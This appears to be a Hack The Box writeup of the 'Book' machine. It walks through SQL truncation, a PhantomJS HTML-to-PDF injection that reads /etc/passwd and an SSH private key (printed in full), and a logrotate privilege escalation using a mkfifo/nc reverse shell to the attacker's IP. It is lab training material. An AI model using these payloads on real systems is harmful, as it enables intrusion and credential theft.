&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;XMLHttpRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;lt;script&amp;gt;x=new XMLHttpRequest;x.onload=function(){document.write(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;style&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;width:100%; word-wrap: break-word;&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt; + this.responseText + &lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/p&amp;gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;};x.open&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;&quot;GET&quot;,&quot;file:/&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//home/reader/.ssh/id_rsa&quot;);x.send();&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Notice that I had to specify width of &lt;code class=&quot;highlighter-rouge&quot;&gt;100%&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;break-word&lt;/code&gt;. This is because the key was too long and parts of the key will be missed out if I didn’t.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/book14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I then used &lt;code class=&quot;highlighter-rouge&quot;&gt;pdftotext&lt;/code&gt; to convert the PDF to text:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;pdftotext 19868.pdf &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Because of the &lt;code class=&quot;highlighter-rouge&quot;&gt;break-word&lt;/code&gt;, you will need to manually remove the newlines to fix the private key.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;19868.txt
&lt;span class=&quot;nt&quot;&gt;-----BEGIN&lt;/span&gt; RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA2JJQsccK6fE05OWbVGOuKZdf0FyicoUrrm821nHygmLgWSpJ
G8m6UNZyRGj77eeYGe/7YIQYPATNLSOpQIue3knhDiEsfR99rMg7FRnVCpiHPpJ0
WxtCK0VlQUwxZ6953D16uxlRH8LXeI6BNAIjF0Z7zgkzRhTYJpKs6M80NdjUCl/0
ePV8RKoYVWuVRb4nFG1Es0bOj29lu64yWd/j3xWXHgpaJciHKxeNlr8x6NgbPv4s
7WaZQ4cjd+yzpOCJw9J91Vi33gv6+KCIzr+TEfzI82+hLW1UGx/13fh20cZXA6PK
75I5d5Holg7ME40BU06Eq0E3EOY6whCPlzndVwIDAQABAoIBAQCs+kh7hihAbIi7
3mxvPeKok6BSsvqJD7aw72FUbNSusbzRWwXjrP8ke/Pukg/OmDETXmtgToFwxsD+
McKIrDvq/gVEnNiE47ckXxVZqDVR7jvvjVhkQGRcXWQfgHThhPWHJI+3iuQRwzUI
tIGcAaz3dTODgDO04Qc33+U9WeowqpOaqg9rWn00vgzOIjDgeGnbzr9ERdiuX6WJ
jhPHFI7usIxmgX8Q2/nx3LSUNeZ2vHK5PMxiyJSQLiCbTBI/DurhMelbFX50/owz
7Qd2hMSr7qJVdfCQjkmE3x/L37YQEnQph6lcPzvVGOEGQzkuu4ljFkYz6sZ8GMx6
GZYD7sW5AoGBAO89fhOZC8osdYwOAISAk1vjmW9ZSPLYsmTmk3A7jOwke0o8/4FL
E2vk2W5a9R6N5bEb9yvSt378snyrZGWpaIOWJADu+9xpZScZZ9imHHZiPlSNbc8/
ciqzwDZfSg5QLoe8CV/7sL2nKBRYBQVL6D8SBRPTIR+J/wHRtKt5PkxjAoGBAOe+
SRM/Abh5xub6zThrkIRnFgcYEf5CmVJX9IgPnwgWPHGcwUjKEH5pwpei6Sv8et7l
skGl3dh4M/2Tgl/gYPwUKI4ori5OMRWykGANbLAt+Diz9mA3FQIi26ickgD2fv+V
o5GVjWTOlfEj74k8hC6GjzWHna0pSlBEiAEF6Xt9AoGAZCDjdIZYhdxHsj9l/g7m
Hc5LOGww+NqzB0HtsUprN6YpJ7AR6+YlEcItMl/FOW2AFbkzoNbHT9GpTj5ZfacC
hBhBp1ZeeShvWobqjKUxQmbp2W975wKR4MdsihUlpInwf4S2k8J+fVHJl4IjT80u
Pb9n+p0hvtZ9sSA4so/DACsCgYEA1y1ERO6X9mZ8XTQ7IUwfIBFnzqZ27pOAMYkh
sMRwcd3TudpHTgLxVa91076cqw8AN78nyPTuDHVwMN+qisOYyfcdwQHc2XoY8YCf
tdBBP0Uv2dafya7bfuRG+USH/QTj3wVen2sxoox/hSxM2iyqv1iJ2LZXndVc/zLi
5bBLnzECgYEAlLiYGzP92qdmlKLLWS7nPM0YzhbN9q0qC3ztk/+1v8pjj162pnlW
y1K/LbqIV3C01ruxVBOV7ivUYrRkxR/u5QbS3WxOnK0FYjlS7UUAc4r0zMfWT9TN
nkeaf9obYKsrORVuKKVNFzrWeXcVx+oG3NisSABIprhDfKUSbHzLIR4&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 
&lt;span class=&quot;nt&quot;&gt;-----END&lt;/span&gt; RSA PRIVATE KEY-----&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h1 id=&quot;usertxt&quot;&gt;user.txt&lt;/h1&gt;

&lt;p&gt;Using the private key, we can &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; into the box.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-raw&quot; data-lang=&quot;raw&quot;&gt;$ chmod 700 19868.txt
$ ssh -i 19868.txt reader@book.htb
reader@book:~$ cat user.txt 
51c1XXXXXXXXXXXXXXXXXXXXXXXXXXXX&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h1 id=&quot;enumeration-2&quot;&gt;Enumeration (2)&lt;/h1&gt;

&lt;p&gt;In the home directory was&lt;/p&gt;

&lt;p&gt;I first uploaded &lt;a href=&quot;https://github.com/DominicBreuker/pspy&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;pspy&lt;/code&gt;&lt;/a&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; so that I could monitor for processes.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;reader@book:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget http://10.10.XX.XX/pspy
&lt;span class=&quot;nt&quot;&gt;--2020-07-11&lt;/span&gt; 11:40:51--  http://10.10.XX.XX/pspy
Connecting to 10.10.XX.XX:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1090528 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1.0M&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;application/octet-stream]
Saving to: ‘pspy’

pspy                                                    100%[&lt;span class=&quot;o&quot;&gt;===============================================================================================================================&amp;gt;]&lt;/span&gt;   1.04M   584KB/s    &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;1.8s    

2020-07-11 11:40:54 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;584 KB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - ‘pspy’ saved &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1090528/1090528]

reader@book:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x pspy &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; ./pspy
...
2020/07/11 11:50:22 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;48727  | /usr/sbin/logrotate &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; /root/log.cfg &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;logrotate&lt;/code&gt; was being ran from time to time as &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; and its version was outdated!&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;reader@book:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;logrotate &lt;span class=&quot;nt&quot;&gt;--version&lt;/span&gt;
logrotate 3.11.0&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h1 id=&quot;exploitation-2&quot;&gt;Exploitation (2)&lt;/h1&gt;

&lt;p&gt;According to this &lt;a href=&quot;https://packetstormsecurity.com/files/154743/Logrotate-3.15.1-Privilege-Escalation.html&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;link&lt;/code&gt;&lt;/a&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;logrotate&lt;/code&gt; version &lt;code class=&quot;highlighter-rouge&quot;&gt;3.15.1&lt;/code&gt; and below are vulnerable to an exploit called &lt;code class=&quot;highlighter-rouge&quot;&gt;logrotten&lt;/code&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;reader@book:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget http://10.10.XX.XX/logrotten.c
&lt;span class=&quot;nt&quot;&gt;--2020-07-11&lt;/span&gt; 12:43:27--  http://10.10.14.7/logrotten.c
Connecting to 10.10.14.7:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5796 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;5.7K&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;text/plain]
Saving to: ‘logrotten.c’

logrotten.c                                             100%[&lt;span class=&quot;o&quot;&gt;===============================================================================================================================&amp;gt;]&lt;/span&gt;   5.66K  &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;.-KB/s    &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.006s  

2020-07-11 12:43:27 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;975 KB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - ‘logrotten.c’ saved &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;5796/5796]

reader@book:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gcc logrotten.c 
reader@book:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gcc logrotten.c &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; logrotten
reader@book:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./logrotten 
usage: logrotten &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;OPTION...] &amp;lt;logfile&amp;gt;
  &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--help&lt;/span&gt;                 Print this &lt;span class=&quot;nb&quot;&gt;help&lt;/span&gt;               
  &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--targetdir&lt;/span&gt; &amp;lt;&lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;      Abosulte path to the target directory
  &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--payloadfile&lt;/span&gt; &amp;lt;file&amp;gt;   File that contains the payload
  &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--sleep&lt;/span&gt; &amp;lt;sec&amp;gt;          Wait before writing the payload
  &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--debug&lt;/span&gt;                Print verbose debug messages  
  &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--compress&lt;/span&gt;             Hijack compressed files instead of created logfiles
  &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt;                 Use IN_OPEN instead of IN_MOVED_FROM&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;To use &lt;code class=&quot;highlighter-rouge&quot;&gt;logrotten&lt;/code&gt;, we need to prepare a script that will act as our payload.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;payloadfile
&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; /tmp/f&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkfifo&lt;/span&gt; /tmp/f&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /tmp/f|/bin/sh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 2&amp;gt;&amp;amp;1|nc 10.10.XX.XX 1337 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/tmp/f&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The above script creates a reverse shell connection back to us, so need to prepare a listener as well using &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 1337
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 1337 ...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Lastly, we will need to target a suitable log file that is configured to create a new copy of itself when rotated. Coincidentially, there was a &lt;code class=&quot;highlighter-rouge&quot;&gt;access.log&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/reader/backups/&lt;/code&gt;. Echoing a line into it causes it to rotate immediately!&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;reader@book:~/backups&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt; 
total 8
drwxr-xr-x 2 reader reader 4096 Jul 11 13:58 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 7 reader reader 4096 Jan 29 13:05 ..
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 reader reader    0 Jul 11 13:42 access.log
reader@book:~/backups&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;something &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; access.log
reader@book:~/backups&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt; 
total 12
drwxr-xr-x 2 reader reader 4096 Jul 11 13:59 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 7 reader reader 4096 Jan 29 13:05 ..
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 reader reader    0 Jul 11 13:59 access.log
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 reader reader   10 Jul 11 13:59 access.log.1&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;To execute &lt;code class=&quot;highlighter-rouge&quot;&gt;logrotten&lt;/code&gt; successfully, I will need to start another &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; session that will echo the line into &lt;code class=&quot;highlighter-rouge&quot;&gt;access.log&lt;/code&gt; while my current &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; session will execute &lt;code class=&quot;highlighter-rouge&quot;&gt;logrotten&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;On current &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; session:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;reader@book:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./logrotten &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; payloadfile /home/reader/backups/access.log
Waiting &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;rotating /home/reader/backups/access.log...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;On another &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; session:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;reader@book:~/backups&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;something &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; access.log&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;On current &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; session again:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Renamed /home/reader/backups with /home/reader/backups2 and created symlink to /etc/bash_completion.d
Waiting 1 seconds before writing payload...
Done!&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h1 id=&quot;roottxt&quot;&gt;root.txt&lt;/h1&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;logrotten&lt;/code&gt; has successfully created a symbolic link of our payload to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/bash_completion.d&lt;/code&gt;, so now we just need to run &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/bash&lt;/code&gt; to force the execution of our payload and voila, we caught the shell as root!&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.XX.XX] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.176] 49512
&lt;span class=&quot;c&quot;&gt;# id
&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# cat /root/root.txt
&lt;/span&gt;
84daXXXXXXXXXXXXXXXXXXXXXXXXXXXX&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Rooted ! Thank you for reading and look forward for more writeups and articles !&lt;/p&gt;</content><author><name></name></author><summary type="html">Configuration The operating systems that I will be using to tackle this machine is a Kali Linux VM and a Windows Commando VM. What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to /etc/hosts. $ echo &quot;10.10.10.176 book.htb&quot; &amp;gt;&amp;gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. $ nmap -sV -sT -sC -T5 book.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-14 04:27 EDT Nmap scan report for book.htb (10.10.10.176) Host is up (0.24s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 f7:fc:57:99:f6:82:e0:03:d6:03:bc:09:43:01:55:b7 (RSA) | 256 a3:e5:d1:74:c4:8a:e8:c8:52:c7:17:83:4a:54:31:bd (ECDSA) |_ 256 e3:62:68:72:e2:c0:ae:46:67:3d:cb:46:bf:69:b9:6a (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: LIBRARY - Read | Learn | Have Fun Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 24.53 seconds Enumeration (1) Not much can be done with the ssh service as we do not have any credentials on hand so lets come back to it later. As for the http service, maybe lets see what it has to offer ? http://book.htb/: We don’t have an account but lets sign up for one. Logging in brings us to what seems to be an online book collection. http://book.htb/home.php: There was a page where we could upload our own books but it will be subjected to approval, which I believe is by the admin. http://book.htb/collections.php: We also see found the admin’s email admin@book.htb. http://book.htb/contact.php: It took a while to look for a possible vector into the box but I happened to chance upon something on the login/register page where I saw a certain segment in the javascript code where it does the validation of the user’s input when registering. http://book.htb/: function validateForm() { var x = document.forms[&quot;myForm&quot;][&quot;name&quot;].value; var y = document.forms[&quot;myForm&quot;][&quot;email&quot;].value; if (x == &quot;&quot;) { alert(&quot;Please fill name field. Should not be more than 10 characters&quot;); return false; } if (y == &quot;&quot;) { alert(&quot;Please fill email field. Should not be more than 20 characters&quot;); return false; } } This validation code is poorly implemented as even though the alerts informs the user of the character limit, it does not enforce it. Lets check if this is enfored on the server side. I decided to register a new account but with an email of length 21, admin@book.htb1234567. After submitting the above request, I tried to logging in but failed due to wrong credentials. Is it possible that my email was truncated? I tried logging in one more time but with one character less, admin@book.htb123456, and was successful! This seems like it is vulnerable to SQL Truncation Attack. If we try registering with the email admin@book.htb%20%20%20%20%20%201 and logging it with it, we login as admin@book.htb! However, not much can be done but perhaps there is an admin page somewhere so lets brute-force some directories with gobuster! $ gobuster dir -u http://book.htb/ -w /usr/share/wordlists/dirb/big.txt -t 12 -k -x .php =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://book.htb/ [+] Threads: 12 [+] Wordlist: /usr/share/wordlists/dirb/big.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: php [+] Timeout: 10s =============================================================== 2020/04/09 12:41:45 Starting gobuster =============================================================== /.htaccess (Status: 403) /.htaccess.php (Status: 403) /.htpasswd (Status: 403) /.htpasswd.php (Status: 403) /admin (Status: 301) /books.php (Status: 302) /collections.php (Status: 302) /contact.php (Status: 302) /db.php (Status: 200) /docs (Status: 301) /download.php (Status: 302) /feedback.php (Status: 302) /home.php (Status: 302) /images (Status: 301) /index.php (Status: 200) /logout.php (Status: 302) /profile.php (Status: 302) /search.php (Status: 302) /server-status (Status: 403) /settings.php (Status: 302) =============================================================== 2020/04/09 12:51:57 Finished =============================================================== Seems like /admin is what we are looking for. Fortunately for us, we already have the admin credentials so lets just login with it. However, there was only one page that caught my attention. http://book.htb/admin/collections.php. Clicking on the PDF link beside User will download a .pdf file containing a list of the usernames and emails in a table. Likewise, for the PDF link beside Collections will download a .pdf file containing the list of books on the website. It seems like the .pdf files are generated on the fly but the question is how? I tried inject all sort of values but something stuck out: HTML tags. Apparently, HTML tags are being rendered when generating the pdf files. This is what happens when I change my username to &amp;lt;h1&amp;gt;I am a H1&amp;lt;/h1&amp;gt;: Interesting… Lets see if we can perform SSRF with this: First I start a nc server on port 80 to receive the web request. $ nc -lvnp 80 listening on [any] 80 ... I then change my username to &amp;lt;img src =&quot;http://10.10.XX.XX&quot;&amp;gt; and download the .pdf again. Sadly I did not get any request, probably because the name was truncated to probably 10 characters if you remember from registration validation code. Lets try to submit a book and use the PDF link for Collections. This time, I put &amp;lt;img src =&quot;http://10.10.XX.XX&quot;&amp;gt; as the Book Title, uploaded a random file and then download the .pdf file. On my nc, I caught the raw web request: connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.176] 55942 GET / HTTP/1.1 User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1 Accept: */* Connection: Keep-Alive Accept-Encoding: gzip, deflate Accept-Language: en,* Host: 10.10.XX.XX SSRF was successful but what caught my eye was the PhantomJS in the User-Agent header. PhantomJS is a headless web browser scriptable with JavaScript. It runs on Windows, macOS, Linux, and FreeBSD. Using QtWebKit as the back-end, it offers fast and native support for various web standards: DOM handling, CSS selector, JSON, Canvas, and SVG. The following simple script for PhantomJS loads Google homepage, waits a bit, and then captures it to an image. Exploitation (1) From this link, it states that PhantomJS has the function to create PDFs from HTML. Cool! To exploit this, I followed this guide to read the /etc/passwd file. Submitting the following as my Book Title: &amp;lt;script&amp;gt;x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open(&quot;GET&quot;,&quot;file:///etc/passwd&quot;);x.send();&amp;lt;/script&amp;gt; Returns this pdf: Hmm…There is the ssh service running on the machine and there is a user called reader with the home directory at /home/reader. Lets see if we can find any private keys in /home/reader/.ssh, which are typically named as id_rsa. &amp;lt;script&amp;gt;x=new XMLHttpRequest;x.onload=function(){document.write('&amp;lt;script&amp;gt;x=new XMLHttpRequest;x.onload=function(){document.write('&amp;lt;p style=&quot;width:100%; word-wrap: break-word;&quot;&amp;gt;' + this.responseText + '&amp;lt;/p&amp;gt;')};x.open(&quot;GET&quot;,&quot;file:///home/reader/.ssh/id_rsa&quot;);x.send();&amp;lt;/script&amp;gt; Notice that I had to specify width of 100% and break-word. This is because the key was too long and parts of the key will be missed out if I didn’t. I then used pdftotext to convert the PDF to text: $ pdftotext 19868.pdf Because of the break-word, you will need to manually remove the newlines to fix the private key. $ cat 19868.txt -----BEGIN RSA PRIVATE KEY----- 